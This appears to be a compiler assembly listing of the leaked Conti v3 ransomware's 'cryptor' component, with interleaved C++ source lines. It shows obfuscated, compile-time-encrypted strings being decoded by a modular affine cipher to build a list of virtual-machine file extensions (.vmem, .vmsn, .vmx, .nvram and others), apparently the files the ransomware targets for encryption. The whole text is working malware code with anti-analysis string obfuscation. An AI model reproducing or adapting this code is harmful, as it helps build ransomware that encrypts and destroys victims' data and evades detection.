  0022a	c6 44 24 43 25	 mov	 BYTE PTR $T4[rsp+3], 37	; 00000025H
  0022f	c6 44 24 44 43	 mov	 BYTE PTR $T4[rsp+4], 67	; 00000043H
  00234	c6 44 24 45 31	 mov	 BYTE PTR $T4[rsp+5], 49	; 00000031H
  00239	c6 44 24 46 43	 mov	 BYTE PTR $T4[rsp+6], 67	; 00000043H
  0023e	c6 44 24 47 1f	 mov	 BYTE PTR $T4[rsp+7], 31
  00243	c6 44 24 48 43	 mov	 BYTE PTR $T4[rsp+8], 67	; 00000043H
  00248	c6 44 24 49 43	 mov	 BYTE PTR $T4[rsp+9], 67	; 00000043H
  0024d	c6 44 24 4a 43	 mov	 BYTE PTR $T4[rsp+10], 67 ; 00000043H
  00252	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T4[rsp+1]

; 58   :         return m_isDecrypted;

  00257	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T4[rsp]

; 63   :         if (!isDecrypted())

  0025c	84 c0		 test	 al, al
  0025e	75 61		 jne	 SHORT $LN128@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00260	4c 8b c3	 mov	 r8, rbx
  00263	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL129@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00270	42 0f b6 4c 04
	41		 movzx	 ecx, BYTE PTR $T4[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00276	b8 43 00 00 00	 mov	 eax, 67			; 00000043H
  0027b	2b c1		 sub	 eax, ecx
  0027d	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00280	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00285	f7 e9		 imul	 ecx
  00287	03 d1		 add	 edx, ecx
  00289	c1 fa 06	 sar	 edx, 6
  0028c	8b c2		 mov	 eax, edx
  0028e	c1 e8 1f	 shr	 eax, 31
  00291	03 d0		 add	 edx, eax
  00293	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00296	2b c8		 sub	 ecx, eax
  00298	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0029d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  002a0	f7 e9		 imul	 ecx
  002a2	03 d1		 add	 edx, ecx
  002a4	c1 fa 06	 sar	 edx, 6
  002a7	8b c2		 mov	 eax, edx
  002a9	c1 e8 1f	 shr	 eax, 31
  002ac	03 d0		 add	 edx, eax
  002ae	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002b1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002b3	42 88 4c 04 41	 mov	 BYTE PTR $T4[rsp+r8+1], cl
  002b8	49 ff c0	 inc	 r8
  002bb	49 83 f8 0a	 cmp	 r8, 10
  002bf	72 af		 jb	 SHORT $LL129@CheckForVi
$LN128@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 492  : 		OBFW(L".pvm"),

  002c1	48 8d 44 24 41	 lea	 rax, QWORD PTR $T4[rsp+1]
  002c6	48 89 85 88 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-232], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002cd	88 5d b0	 mov	 BYTE PTR $T5[rbp-256], bl
  002d0	c6 45 b1 70	 mov	 BYTE PTR $T5[rbp-255], 112 ; 00000070H
  002d4	c6 45 b2 30	 mov	 BYTE PTR $T5[rbp-254], 48 ; 00000030H
  002d8	c6 45 b3 29	 mov	 BYTE PTR $T5[rbp-253], 41 ; 00000029H
  002dc	c6 45 b4 30	 mov	 BYTE PTR $T5[rbp-252], 48 ; 00000030H
  002e0	c6 45 b5 22	 mov	 BYTE PTR $T5[rbp-251], 34 ; 00000022H
  002e4	c6 45 b6 30	 mov	 BYTE PTR $T5[rbp-250], 48 ; 00000030H
  002e8	c6 45 b7 38	 mov	 BYTE PTR $T5[rbp-249], 56 ; 00000038H
  002ec	c6 45 b8 30	 mov	 BYTE PTR $T5[rbp-248], 48 ; 00000030H
  002f0	c6 45 b9 22	 mov	 BYTE PTR $T5[rbp-247], 34 ; 00000022H
  002f4	c6 45 ba 30	 mov	 BYTE PTR $T5[rbp-246], 48 ; 00000030H
  002f8	c6 45 bb 30	 mov	 BYTE PTR $T5[rbp-245], 48 ; 00000030H
  002fc	c6 45 bc 30	 mov	 BYTE PTR $T5[rbp-244], 48 ; 00000030H
  00300	0f b6 45 b1	 movzx	 eax, BYTE PTR $T5[rbp-255]

; 58   :         return m_isDecrypted;

  00304	0f b6 45 b0	 movzx	 eax, BYTE PTR $T5[rbp-256]

; 63   :         if (!isDecrypted())

  00308	84 c0		 test	 al, al
  0030a	75 55		 jne	 SHORT $LN166@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0030c	4c 8b c3	 mov	 r8, rbx
  0030f	90		 npad	 1
$LL167@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00310	42 0f b6 4c 05
	b1		 movzx	 ecx, BYTE PTR $T5[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00316	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0031b	2b c1		 sub	 eax, ecx
  0031d	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00320	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00325	f7 e9		 imul	 ecx
  00327	03 d1		 add	 edx, ecx
  00329	c1 fa 06	 sar	 edx, 6
  0032c	8b c2		 mov	 eax, edx
  0032e	c1 e8 1f	 shr	 eax, 31
  00331	03 d0		 add	 edx, eax
  00333	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00336	2b c8		 sub	 ecx, eax
  00338	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0033d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00340	f7 e9		 imul	 ecx
  00342	03 d1		 add	 edx, ecx
  00344	c1 fa 06	 sar	 edx, 6
  00347	8b c2		 mov	 eax, edx
  00349	c1 e8 1f	 shr	 eax, 31
  0034c	03 d0		 add	 edx, eax
  0034e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00351	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00353	42 88 4c 05 b1	 mov	 BYTE PTR $T5[rbp+r8-255], cl
  00358	49 ff c0	 inc	 r8
  0035b	49 83 f8 0c	 cmp	 r8, 12
  0035f	72 af		 jb	 SHORT $LL167@CheckForVi
$LN166@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 493  : 		OBFW(L".vmem"),

  00361	48 8d 45 b1	 lea	 rax, QWORD PTR $T5[rbp-255]
  00365	48 89 85 90 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-224], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0036c	88 5d c0	 mov	 BYTE PTR $T6[rbp-256], bl
  0036f	c6 45 c1 3e	 mov	 BYTE PTR $T6[rbp-255], 62 ; 0000003eH
  00373	c6 45 c2 0f	 mov	 BYTE PTR $T6[rbp-254], 15
  00377	c6 45 c3 77	 mov	 BYTE PTR $T6[rbp-253], 119 ; 00000077H
  0037b	c6 45 c4 0f	 mov	 BYTE PTR $T6[rbp-252], 15
  0037f	c6 45 c5 60	 mov	 BYTE PTR $T6[rbp-251], 96 ; 00000060H
  00383	c6 45 c6 0f	 mov	 BYTE PTR $T6[rbp-250], 15
  00387	c6 45 c7 45	 mov	 BYTE PTR $T6[rbp-249], 69 ; 00000045H
  0038b	c6 45 c8 0f	 mov	 BYTE PTR $T6[rbp-248], 15
  0038f	c6 45 c9 1c	 mov	 BYTE PTR $T6[rbp-247], 28
  00393	c6 45 ca 0f	 mov	 BYTE PTR $T6[rbp-246], 15
  00397	c6 45 cb 0f	 mov	 BYTE PTR $T6[rbp-245], 15
  0039b	c6 45 cc 0f	 mov	 BYTE PTR $T6[rbp-244], 15
  0039f	0f b6 45 c1	 movzx	 eax, BYTE PTR $T6[rbp-255]

; 58   :         return m_isDecrypted;

  003a3	0f b6 45 c0	 movzx	 eax, BYTE PTR $T6[rbp-256]

; 63   :         if (!isDecrypted())

  003a7	84 c0		 test	 al, al
  003a9	75 5a		 jne	 SHORT $LN204@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  003ab	4c 8b cb	 mov	 r9, rbx
  003ae	66 90		 npad	 2
$LL205@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003b0	42 0f b6 4c 0d
	c1		 movzx	 ecx, BYTE PTR $T6[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  003b6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  003bb	83 e9 0f	 sub	 ecx, 15
  003be	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  003c2	41 f7 e8	 imul	 r8d
  003c5	41 03 d0	 add	 edx, r8d
  003c8	c1 fa 06	 sar	 edx, 6
  003cb	8b c2		 mov	 eax, edx
  003cd	c1 e8 1f	 shr	 eax, 31
  003d0	03 d0		 add	 edx, eax
  003d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003d5	44 2b c0	 sub	 r8d, eax
  003d8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  003dd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  003e1	41 f7 e8	 imul	 r8d
  003e4	41 03 d0	 add	 edx, r8d
  003e7	c1 fa 06	 sar	 edx, 6
  003ea	8b c2		 mov	 eax, edx
  003ec	c1 e8 1f	 shr	 eax, 31
  003ef	03 d0		 add	 edx, eax
  003f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003f4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003f7	46 88 44 0d c1	 mov	 BYTE PTR $T6[rbp+r9-255], r8b
  003fc	49 ff c1	 inc	 r9
  003ff	49 83 f9 0c	 cmp	 r9, 12
  00403	72 ab		 jb	 SHORT $LL205@CheckForVi
$LN204@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 494  : 		OBFW(L".vmsn"),

  00405	48 8d 45 c1	 lea	 rax, QWORD PTR $T6[rbp-255]
  00409	48 89 85 98 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-216], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00410	88 5d d0	 mov	 BYTE PTR $T7[rbp-256], bl
  00413	c6 45 d1 23	 mov	 BYTE PTR $T7[rbp-255], 35 ; 00000023H
  00417	c6 45 d2 0a	 mov	 BYTE PTR $T7[rbp-254], 10
  0041b	c6 45 d3 29	 mov	 BYTE PTR $T7[rbp-253], 41 ; 00000029H
  0041f	c6 45 d4 0a	 mov	 BYTE PTR $T7[rbp-252], 10
  00423	c6 45 d5 48	 mov	 BYTE PTR $T7[rbp-251], 72 ; 00000048H
  00427	c6 45 d6 0a	 mov	 BYTE PTR $T7[rbp-250], 10
  0042b	c6 45 d7 09	 mov	 BYTE PTR $T7[rbp-249], 9
  0042f	c6 45 d8 0a	 mov	 BYTE PTR $T7[rbp-248], 10
  00433	c6 45 d9 67	 mov	 BYTE PTR $T7[rbp-247], 103 ; 00000067H
  00437	c6 45 da 0a	 mov	 BYTE PTR $T7[rbp-246], 10
  0043b	c6 45 db 0a	 mov	 BYTE PTR $T7[rbp-245], 10
  0043f	c6 45 dc 0a	 mov	 BYTE PTR $T7[rbp-244], 10
  00443	0f b6 45 d1	 movzx	 eax, BYTE PTR $T7[rbp-255]

; 58   :         return m_isDecrypted;

  00447	0f b6 45 d0	 movzx	 eax, BYTE PTR $T7[rbp-256]

; 63   :         if (!isDecrypted())

  0044b	84 c0		 test	 al, al
  0044d	75 5c		 jne	 SHORT $LN242@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0044f	4c 8b cb	 mov	 r9, rbx
$LL243@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00452	42 0f b6 4c 0d
	d1		 movzx	 ecx, BYTE PTR $T7[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00458	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0045d	83 e9 0a	 sub	 ecx, 10
  00460	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00464	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00468	41 f7 e8	 imul	 r8d
  0046b	41 03 d0	 add	 edx, r8d
  0046e	c1 fa 06	 sar	 edx, 6
  00471	8b c2		 mov	 eax, edx
  00473	c1 e8 1f	 shr	 eax, 31
  00476	03 d0		 add	 edx, eax
  00478	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0047b	44 2b c0	 sub	 r8d, eax
  0047e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00483	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00487	41 f7 e8	 imul	 r8d
  0048a	41 03 d0	 add	 edx, r8d
  0048d	c1 fa 06	 sar	 edx, 6
  00490	8b c2		 mov	 eax, edx
  00492	c1 e8 1f	 shr	 eax, 31
  00495	03 d0		 add	 edx, eax
  00497	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0049a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0049d	46 88 44 0d d1	 mov	 BYTE PTR $T7[rbp+r9-255], r8b
  004a2	49 ff c1	 inc	 r9
  004a5	49 83 f9 0c	 cmp	 r9, 12
  004a9	72 a7		 jb	 SHORT $LL243@CheckForVi
$LN242@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 495  : 		OBFW(L".vmsd"),

  004ab	48 8d 45 d1	 lea	 rax, QWORD PTR $T7[rbp-255]
  004af	48 89 85 a0 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-208], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  004b6	88 5d 30	 mov	 BYTE PTR $T8[rbp-256], bl
  004b9	c6 45 31 38	 mov	 BYTE PTR $T8[rbp-255], 56 ; 00000038H
  004bd	c6 45 32 4b	 mov	 BYTE PTR $T8[rbp-254], 75 ; 0000004bH
  004c1	c6 45 33 0d	 mov	 BYTE PTR $T8[rbp-253], 13
  004c5	c6 45 34 4b	 mov	 BYTE PTR $T8[rbp-252], 75 ; 0000004bH
  004c9	c6 45 35 57	 mov	 BYTE PTR $T8[rbp-251], 87 ; 00000057H
  004cd	c6 45 36 4b	 mov	 BYTE PTR $T8[rbp-250], 75 ; 0000004bH
  004d1	c6 45 37 32	 mov	 BYTE PTR $T8[rbp-249], 50 ; 00000032H
  004d5	c6 45 38 4b	 mov	 BYTE PTR $T8[rbp-248], 75 ; 0000004bH
  004d9	c6 45 39 73	 mov	 BYTE PTR $T8[rbp-247], 115 ; 00000073H
  004dd	c6 45 3a 4b	 mov	 BYTE PTR $T8[rbp-246], 75 ; 0000004bH
  004e1	c6 45 3b 63	 mov	 BYTE PTR $T8[rbp-245], 99 ; 00000063H
  004e5	c6 45 3c 4b	 mov	 BYTE PTR $T8[rbp-244], 75 ; 0000004bH
  004e9	c6 45 3d 4b	 mov	 BYTE PTR $T8[rbp-243], 75 ; 0000004bH
  004ed	c6 45 3e 4b	 mov	 BYTE PTR $T8[rbp-242], 75 ; 0000004bH
  004f1	0f b6 45 31	 movzx	 eax, BYTE PTR $T8[rbp-255]

; 58   :         return m_isDecrypted;

  004f5	0f b6 45 30	 movzx	 eax, BYTE PTR $T8[rbp-256]

; 63   :         if (!isDecrypted())

  004f9	84 c0		 test	 al, al
  004fb	75 58		 jne	 SHORT $LN284@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  004fd	4c 8b cb	 mov	 r9, rbx
$LL285@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00500	42 0f b6 4c 0d
	31		 movzx	 ecx, BYTE PTR $T8[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00506	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0050b	83 e9 4b	 sub	 ecx, 75			; 0000004bH
  0050e	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00512	41 f7 e8	 imul	 r8d
  00515	41 03 d0	 add	 edx, r8d
  00518	c1 fa 06	 sar	 edx, 6
  0051b	8b c2		 mov	 eax, edx
  0051d	c1 e8 1f	 shr	 eax, 31
  00520	03 d0		 add	 edx, eax
  00522	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00525	44 2b c0	 sub	 r8d, eax
  00528	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0052d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00531	41 f7 e8	 imul	 r8d
  00534	41 03 d0	 add	 edx, r8d
  00537	c1 fa 06	 sar	 edx, 6
  0053a	8b c2		 mov	 eax, edx
  0053c	c1 e8 1f	 shr	 eax, 31
  0053f	03 d0		 add	 edx, eax
  00541	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00544	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00547	46 88 44 0d 31	 mov	 BYTE PTR $T8[rbp+r9-255], r8b
  0054c	49 ff c1	 inc	 r9
  0054f	49 83 f9 0e	 cmp	 r9, 14
  00553	72 ab		 jb	 SHORT $LL285@CheckForVi
$LN284@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 496  : 		OBFW(L".nvram"),

  00555	48 8d 45 31	 lea	 rax, QWORD PTR $T8[rbp-255]
  00559	48 89 85 a8 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-200], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00560	88 5c 24 50	 mov	 BYTE PTR $T9[rsp], bl
  00564	c6 44 24 51 0b	 mov	 BYTE PTR $T9[rsp+1], 11
  00569	88 5c 24 52	 mov	 BYTE PTR $T9[rsp+2], bl
  0056d	c6 44 24 53 64	 mov	 BYTE PTR $T9[rsp+3], 100 ; 00000064H
  00572	88 5c 24 54	 mov	 BYTE PTR $T9[rsp+4], bl
  00576	c6 44 24 55 49	 mov	 BYTE PTR $T9[rsp+5], 73	; 00000049H
  0057b	88 5c 24 56	 mov	 BYTE PTR $T9[rsp+6], bl
  0057f	c6 44 24 57 6a	 mov	 BYTE PTR $T9[rsp+7], 106 ; 0000006aH
  00584	88 5c 24 58	 mov	 BYTE PTR $T9[rsp+8], bl
  00588	88 5c 24 59	 mov	 BYTE PTR $T9[rsp+9], bl
  0058c	88 5c 24 5a	 mov	 BYTE PTR $T9[rsp+10], bl
  00590	0f b6 44 24 51	 movzx	 eax, BYTE PTR $T9[rsp+1]

; 58   :         return m_isDecrypted;

  00595	0f b6 44 24 50	 movzx	 eax, BYTE PTR $T9[rsp]

; 63   :         if (!isDecrypted())

  0059a	84 c0		 test	 al, al
  0059c	75 55		 jne	 SHORT $LN318@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0059e	4c 8b cb	 mov	 r9, rbx
$LL319@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005a1	42 0f b6 44 0c
	51		 movzx	 eax, BYTE PTR $T9[rsp+r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  005a7	44 6b c0 d6	 imul	 r8d, eax, -42		; ffffffffffffffd6H

; 40   :     return (a % n + n) % n;

  005ab	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005b0	41 f7 e8	 imul	 r8d
  005b3	41 03 d0	 add	 edx, r8d
  005b6	c1 fa 06	 sar	 edx, 6
  005b9	8b c2		 mov	 eax, edx
  005bb	c1 e8 1f	 shr	 eax, 31
  005be	03 d0		 add	 edx, eax
  005c0	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005c3	44 2b c0	 sub	 r8d, eax
  005c6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005cb	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  005cf	41 f7 e8	 imul	 r8d
  005d2	41 03 d0	 add	 edx, r8d
  005d5	c1 fa 06	 sar	 edx, 6
  005d8	8b c2		 mov	 eax, edx
  005da	c1 e8 1f	 shr	 eax, 31
  005dd	03 d0		 add	 edx, eax
  005df	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005e2	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005e5	46 88 44 0c 51	 mov	 BYTE PTR $T9[rsp+r9+1], r8b
  005ea	49 ff c1	 inc	 r9
  005ed	49 83 f9 0a	 cmp	 r9, 10
  005f1	72 ae		 jb	 SHORT $LL319@CheckForVi
$LN318@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 497  : 		OBFW(L".vmx"),

  005f3	48 8d 44 24 51	 lea	 rax, QWORD PTR $T9[rsp+1]
  005f8	48 89 85 b0 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-192], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  005ff	88 5c 24 60	 mov	 BYTE PTR $T10[rsp], bl
  00603	c6 44 24 61 71	 mov	 BYTE PTR $T10[rsp+1], 113 ; 00000071H
  00608	c6 44 24 62 4f	 mov	 BYTE PTR $T10[rsp+2], 79 ; 0000004fH
  0060d	c6 44 24 63 61	 mov	 BYTE PTR $T10[rsp+3], 97 ; 00000061H
  00612	c6 44 24 64 4f	 mov	 BYTE PTR $T10[rsp+4], 79 ; 0000004fH
  00617	c6 44 24 65 65	 mov	 BYTE PTR $T10[rsp+5], 101 ; 00000065H
  0061c	c6 44 24 66 4f	 mov	 BYTE PTR $T10[rsp+6], 79 ; 0000004fH
  00621	c6 44 24 67 33	 mov	 BYTE PTR $T10[rsp+7], 51 ; 00000033H
  00626	c6 44 24 68 4f	 mov	 BYTE PTR $T10[rsp+8], 79 ; 0000004fH
  0062b	c6 44 24 69 4f	 mov	 BYTE PTR $T10[rsp+9], 79 ; 0000004fH
  00630	c6 44 24 6a 4f	 mov	 BYTE PTR $T10[rsp+10], 79 ; 0000004fH
  00635	0f b6 44 24 61	 movzx	 eax, BYTE PTR $T10[rsp+1]

; 58   :         return m_isDecrypted;

  0063a	0f b6 44 24 60	 movzx	 eax, BYTE PTR $T10[rsp]

; 63   :         if (!isDecrypted())

  0063f	84 c0		 test	 al, al
  00641	75 61		 jne	 SHORT $LN352@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00643	4c 8b c3	 mov	 r8, rbx
  00646	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL353@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00650	42 0f b6 4c 04
	61		 movzx	 ecx, BYTE PTR $T10[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00656	b8 4f 00 00 00	 mov	 eax, 79			; 0000004fH
  0065b	2b c1		 sub	 eax, ecx
  0065d	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00660	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00665	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00668	f7 e9		 imul	 ecx
  0066a	03 d1		 add	 edx, ecx
  0066c	c1 fa 06	 sar	 edx, 6
  0066f	8b c2		 mov	 eax, edx
  00671	c1 e8 1f	 shr	 eax, 31
  00674	03 d0		 add	 edx, eax
  00676	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00679	2b c8		 sub	 ecx, eax
  0067b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00680	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00683	f7 e9		 imul	 ecx
  00685	03 d1		 add	 edx, ecx
  00687	c1 fa 06	 sar	 edx, 6
  0068a	8b c2		 mov	 eax, edx
  0068c	c1 e8 1f	 shr	 eax, 31
  0068f	03 d0		 add	 edx, eax
  00691	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00694	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00696	42 88 4c 04 61	 mov	 BYTE PTR $T10[rsp+r8+1], cl
  0069b	49 ff c0	 inc	 r8
  0069e	49 83 f8 0a	 cmp	 r8, 10
  006a2	72 ac		 jb	 SHORT $LL353@CheckForVi
$LN352@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 498  : 		OBFW(L".raw"),

  006a4	48 8d 44 24 61	 lea	 rax, QWORD PTR $T10[rsp+1]
  006a9	48 89 85 b8 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-184], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  006b0	88 5d 40	 mov	 BYTE PTR $T11[rbp-256], bl
  006b3	c6 45 41 47	 mov	 BYTE PTR $T11[rbp-255], 71 ; 00000047H
  006b7	c6 45 42 66	 mov	 BYTE PTR $T11[rbp-254], 102 ; 00000066H
  006bb	c6 45 43 01	 mov	 BYTE PTR $T11[rbp-253], 1
  006bf	c6 45 44 66	 mov	 BYTE PTR $T11[rbp-252], 102 ; 00000066H
  006c3	c6 45 45 1b	 mov	 BYTE PTR $T11[rbp-251], 27
  006c7	c6 45 46 66	 mov	 BYTE PTR $T11[rbp-250], 102 ; 00000066H
  006cb	c6 45 47 29	 mov	 BYTE PTR $T11[rbp-249], 41 ; 00000029H
  006cf	c6 45 48 66	 mov	 BYTE PTR $T11[rbp-248], 102 ; 00000066H
  006d3	c6 45 49 08	 mov	 BYTE PTR $T11[rbp-247], 8
  006d7	c6 45 4a 66	 mov	 BYTE PTR $T11[rbp-246], 102 ; 00000066H
  006db	c6 45 4b 76	 mov	 BYTE PTR $T11[rbp-245], 118 ; 00000076H
  006df	c6 45 4c 66	 mov	 BYTE PTR $T11[rbp-244], 102 ; 00000066H
  006e3	c6 45 4d 66	 mov	 BYTE PTR $T11[rbp-243], 102 ; 00000066H
  006e7	c6 45 4e 66	 mov	 BYTE PTR $T11[rbp-242], 102 ; 00000066H
  006eb	0f b6 45 41	 movzx	 eax, BYTE PTR $T11[rbp-255]

; 58   :         return m_isDecrypted;

  006ef	0f b6 45 40	 movzx	 eax, BYTE PTR $T11[rbp-256]

; 63   :         if (!isDecrypted())

  006f3	84 c0		 test	 al, al
  006f5	75 5e		 jne	 SHORT $LN394@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  006f7	4c 8b cb	 mov	 r9, rbx
  006fa	66 0f 1f 44 00
	00		 npad	 6
$LL395@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00700	42 0f b6 4c 0d
	41		 movzx	 ecx, BYTE PTR $T11[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00706	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0070b	83 e9 66	 sub	 ecx, 102		; 00000066H
  0070e	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00712	41 f7 e8	 imul	 r8d
  00715	41 03 d0	 add	 edx, r8d
  00718	c1 fa 06	 sar	 edx, 6
  0071b	8b c2		 mov	 eax, edx
  0071d	c1 e8 1f	 shr	 eax, 31
  00720	03 d0		 add	 edx, eax
  00722	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00725	44 2b c0	 sub	 r8d, eax
  00728	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0072d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00731	41 f7 e8	 imul	 r8d
  00734	41 03 d0	 add	 edx, r8d
  00737	c1 fa 06	 sar	 edx, 6
  0073a	8b c2		 mov	 eax, edx
  0073c	c1 e8 1f	 shr	 eax, 31
  0073f	03 d0		 add	 edx, eax
  00741	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00744	44 2b c0	 sub	 r8d, eax

